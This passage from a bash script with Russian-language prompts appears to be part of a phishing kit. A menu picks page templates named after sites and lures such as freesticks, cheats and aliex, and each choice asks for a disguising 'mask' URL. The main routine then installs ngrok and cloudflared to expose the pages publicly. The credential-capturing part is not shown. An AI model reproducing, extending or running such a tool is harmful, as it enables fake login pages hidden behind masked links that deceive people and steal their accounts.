   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		12)
			website="layout"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		13)
			website="kfs"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		14)
			website="golos"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		15)
			website="freesticks"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		16)
			website="closed_group"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		17)
			website="cheats"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		18)
			website="change"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		19)
			website="aliex"
   			read -p "${RED}[${WHITE}-${RED}]${GREEN} Введите желаемый url : ${BLUE}"
   			uril=$REPLY
			mask=http://$uril
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
install_ngrok
install_cloudflared
warningad

